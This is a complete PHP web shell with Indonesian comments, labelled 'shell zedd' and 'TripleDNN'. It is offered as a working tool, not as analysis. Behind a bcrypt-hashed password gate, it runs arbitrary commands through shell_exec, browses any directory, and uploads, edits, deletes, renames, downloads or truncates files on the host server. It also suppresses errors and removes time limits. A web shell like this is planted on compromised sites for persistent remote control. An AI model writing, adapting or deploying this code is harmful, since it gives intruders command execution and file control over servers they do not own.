<?php 
$hashedPassword = '$2a$04$L8KAtH3EZsmnYLG.PUvBguPNt.0I681kooUhv2MmCHKW89qEEskPu'; // bcrypt hash
error_reporting(0);
set_time_limit(0);

session_start();
if (!isset($_SESSION['loggedIn'])) {
    $_SESSION['loggedIn'] = false;
}

if (isset($_POST['password'])) {
    if (password_verify($_POST['password'], $hashedPassword)) {
        $_SESSION['loggedIn'] = true;
        echo '<p>Login successful!</p>';
    }
} 

if (!$_SESSION['loggedIn']) {
    ?>
    <html>
    <head>
        <title>Login Administrator</title>
        <link rel="stylesheet" type="text/css" href="https://cdn.statically.io/gh/Zeddgansz/shell/main/styles.css">
    </head>
    <body>
        <div class="login-container">
            <h1 id="flashingText">shell zedd</h1>
            <form method="post">
                <input type="password" name="password">
                <br>
                <input type="submit" name="submit" value="Login"><br>
            </form>
            <p id="emailLink"> <a href="mailto:zeddgans@gmail.com">zeddgans@gmail.com</a></p>
        </div>
    </body>
    </html>
    <?php
    exit; // Exit to prevent the execution of the rest of the code if not logged in
} else {
    echo '<p>Login successful!</p>';
}
?>

<?php
// Set directory root menjadi public_html
$root_dir = realpath(__DIR__);  // Ini mengatur root menjadi folder di mana file PHP ini disimpan
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root_dir;

// Periksa jika direktori yang diminta valid dan dapat diakses
if (!$current_dir || !is_dir($current_dir)) {
    $current_dir = $root_dir; // Jika direktori tidak valid, kembali ke root_dir
}

// Variabel pesan sukses atau gagal
$message = "";

// Fungsi untuk menampilkan list file & folder, dengan folder di atas dan file di bawah
function listDirectory($dir)
{
    $files = scandir($dir);

    // Array untuk menyimpan folder dan file terpisah
    $directories = [];
    $regular_files = [];

    // Pisahkan folder dan file ke dalam array yang berbeda
    foreach ($files as $file) {
        if ($file != "." && $file != "..") {
            if (is_dir($dir . '/' . $file)) {
                $directories[] = $file;  // Masukkan ke array folder
            } else {
                $regular_files[] = $file; // Masukkan ke array file biasa
            }
        }
    }

    // Tampilkan folder di atas
    foreach ($directories as $directory) {
        echo '<tr>';
        echo '<td><a href="?dir=' . urlencode($dir . '/' . $directory) . '">' . $directory . '</a></td>';
        echo '<td>Folder</td>';
        echo '<td>
            <a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($directory) . '">Edit</a> |
            <a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($directory) . '">Delete</a> |
            <a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($directory) . '">Rename</a> |
            <a href="?dir=' . urlencode($dir) . '&download=' . urlencode($directory) . '">Download</a>
        </td>';
        echo '</tr>';
    }

    // Tampilkan file di bawah
    foreach ($regular_files as $file) {
        echo '<tr>';
        echo '<td>' . $file . '</td>';
        echo '<td>' . filesize($dir . '/' . $file) . ' bytes</td>';
        echo '<td>
            <a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($file) . '">Edit</a> |
            <a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($file) . '">Delete</a> |
            <a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($file) . '">Rename</a> |
            <a href="?dir=' . urlencode($dir) . '&download=' . urlencode($file) . '">Download</a> |
            <a href="?dir=' . urlencode($dir) . '&zerobyte=' . urlencode($file) . '">0KB</a>
        </td>';
        echo '</tr>';
    }
}

// Fungsi untuk menghapus file
if (isset($_GET['delete'])) {
    $file_to_delete = $current_dir . '/' . $_GET['delete'];
    if (is_file($file_to_delete)) {
        unlink($file_to_delete);
        $message = "File deleted successfully.";
    } else {
        $message = "Failed to delete file.";
    }
    header("Location: ?dir=" . urlencode($_GET['dir']) . "&message=" . urlencode($message));
    exit;
}

// Fungsi untuk download file
if (isset($_GET['download'])) {
    $file_to_download = $current_dir . '/' . $_GET['download'];
    if (is_file($file_to_download)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_to_download) . '"');
        header('Content-Length: ' . filesize($file_to_download));
        readfile($file_to_download);
        exit;
    }
}

// Fungsi untuk mengosongkan file menjadi 0KB
if (isset($_GET['zerobyte'])) {
    $file_to_zero = $current_dir . '/' . $_GET['zerobyte'];
    if (is_file($file_to_zero)) {
        file_put_contents($file_to_zero, ""); // Kosongkan file
        $message = "File set to 0KB successfully.";
    } else {
        $message = "Failed to set file to 0KB.";
    }
    header("Location: ?dir=" . urlencode($_GET['dir']) . "&message=" . urlencode($message));
    exit;
}

// Fungsi untuk upload file
if (isset($_POST['upload'])) {
    $target_file = $current_dir . '/' . basename($_FILES["file"]["name"]);
    if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
        $message = "File uploaded successfully.";
    } else {
        $message = "Failed to upload file.";
    }
}

// Variabel untuk menyimpan hasil output dan file yang sedang diubah
$output = "";
$edit_file = "";
$edit_content = "";
$rename_file = "";

// Fungsi untuk mengeksekusi command
if (isset($_POST['command'])) {
    $command = escapeshellcmd($_POST['command']);
    $output = shell_exec($command);
}

// Fungsi untuk menangani edit file
if (isset($_GET['edit'])) {
    $edit_file = $current_dir . '/' . $_GET['edit'];
    if (is_file($edit_file)) {
        $edit_content = file_get_contents($edit_file);
    }
}

// Fungsi untuk menyimpan perubahan setelah edit
if (isset($_POST['save_file'])) {
    $file_to_edit = $current_dir . '/' . $_POST['file_name'];
    $new_content = $_POST['file_content'];
    if (file_put_contents($file_to_edit, $new_content) !== false) {
        $message = "File edited successfully.";
    } else {
        $message = "Failed to edit file.";
    }
    header("Location: ?dir=" . urlencode($_GET['dir']) . "&message=" . urlencode($message));
    exit;
}

// Fungsi untuk menangani rename file
if (isset($_GET['rename'])) {
    $rename_file = $_GET['rename'];
}

// Fungsi untuk menyimpan perubahan nama file
if (isset($_POST['rename_file'])) {
    $old_name = $current_dir . '/' . $_POST['old_name'];
    $new_name = $current_dir . '/' . $_POST['new_name'];
    if (rename($old_name, $new_name)) {
        $message = "File renamed successfully.";
    } else {
        $message = "Failed to rename file.";
    }
    header("Location: ?dir=" . urlencode($_GET['dir']) . "&message=" . urlencode($message));
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>TripleDNN</title>
    <style>
        /* Styling dengan tema gelap (latar belakang hitam dan teks terang) */
        body {
            background-color: #121212;
            color: #E0E0E0;
            font-family: Arial, sans-serif;
        }
        h2 {
            color: #BB86FC;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 10px;
            text-align: left;
            font-size: 16px;
        }
        th {
            background-color: #333;
            color: #BB86FC;
        }
        tr:nth-child(even) {
            background-color: #222;
        }
        tr:nth-child(odd) {
            background-color: #121212;
        }
        a {
            color: #03DAC6;
            text-decoration: none;
        }
        a:hover {
            color: #BB86FC;
        }
        button {
            background-color: #03DAC6;
            color: #121212;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #BB86FC;
        }
        textarea {
            width: 100%;
            height: 400px;
            background-color: #222;
            color: #E0E0E0;
            border: 1px solid #BB86FC;
        }
        input[type="file"], input[type="text"] {
            color: #E0E0E0;
            background-color: #222;
            border: 1px solid #BB86FC;
            padding: 10px;
            font-size: 16px;
        }
        .form-container {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        .form-container form {
            margin-right: 10px;
        }
        .output-container {
            margin-top: 20px;
            padding: 15px;
            background-color: #1E1E1E;
            border: 1px solid #BB86FC;
            font-size: 14px;
        }
        .output-container pre {
            margin: 0;
            color: #BB86FC;
        }
        .message {
            color: #BB86FC;
            font-size: 18px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <?php if (!empty($message)): ?>
        <div class="message"><?php echo htmlspecialchars($message); ?></div>
    <?php endif; ?>

    <p>Current Directory: <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" style="color: #03DAC6;"><?php echo $current_dir; ?></a></p>
    
    <div class="form-container">
        <!-- Form untuk upload file -->
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file">
            <button type="submit" name="upload">Upload</button>
        </form>

        <!-- Form untuk membuat file baru -->
        <form method="post">
            <input type="text" name="new_file_name" placeholder="New file name" required>
            <button type="submit" name="create_file">Create File</button>
        </form>
    </div>

    <table border="1">
        <thead>
            <tr>
                <th>File Name</th>
                <th>Size</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php listDirectory($current_dir); ?>
        </tbody>
    </table>

    <!-- Form untuk mengeksekusi command secara global di bawah tabel -->
    <form method="post" style="margin-top: 20px;">
        <input type="text" name="command" placeholder="Command" style="width: 80%; padding: 10px; font-size: 16px;" required>
        <button type="submit">Exec</button>
    </form>

    <!-- Hasil output eksekusi command -->
    <?php if (!empty($output)): ?>
        <div class="output-container">
            <h3>Execution Output:</h3>
            <pre><?php echo htmlspecialchars($output); ?></pre>
        </div>
    <?php endif; ?>

    <!-- Form untuk mengedit file -->
    <?php if (!empty($edit_file)): ?>
        <h3>Edit File: <?php echo htmlspecialchars(basename($edit_file)); ?></h3>
        <form method="post">
            <input type="hidden" name="file_name" value="<?php echo htmlspecialchars(basename($edit_file)); ?>">
            <textarea name="file_content"><?php echo htmlspecialchars($edit_content); ?></textarea>
            <br>
            <button type="submit" name="save_file">Save Changes</button>
        </form>
    <?php endif; ?>

    <!-- Form untuk rename file -->
    <?php if (!empty($rename_file)): ?>
        <h3>Rename File: <?php echo htmlspecialchars($rename_file); ?></h3>
        <form method="post">
            <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($rename_file); ?>">
            <input type="text" name="new_name" placeholder="New name" style="width: 100%; padding: 10px;" required>
            <button type="submit" name="rename_file">Rename</button>
        </form>
    <?php endif; ?>
</body>
</html>
